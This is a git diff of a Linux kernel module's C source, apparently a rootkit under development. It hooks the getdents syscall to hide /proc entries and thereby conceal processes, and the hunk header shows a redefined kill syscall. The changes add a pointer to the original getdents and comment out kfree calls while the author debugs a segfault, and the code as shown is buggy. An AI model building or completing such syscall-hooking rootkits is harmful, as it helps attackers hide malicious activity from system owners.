@@ -91,6 +91,8 @@ asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killi
     will hide /proc/ entries as well to hide process
 */
 
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
     struct linux_dirent {
         long           d_ino;
@@ -115,14 +117,14 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
         }
         bpos += d->d_reclen;
     }
-    return nread;
-    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf));
-    kfree(buf);
-    kfree(d);
-    kfree(nd);
-    kfree(hidefile);
-    kfree((void *)nread);
-    kfree((void *)bpos);
+    //return nread;
+    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //this seems to be the problem line. Makes everything segfault
+    //kfree(buf);
+    //kfree(d);
+    //kfree(nd);
+    //kfree(hidefile);
+    //kfree((void *)nread);
+    //kfree((void *)bpos);
     return nread;
     //return (*original_getdents)(fd,dirp,count);
 }
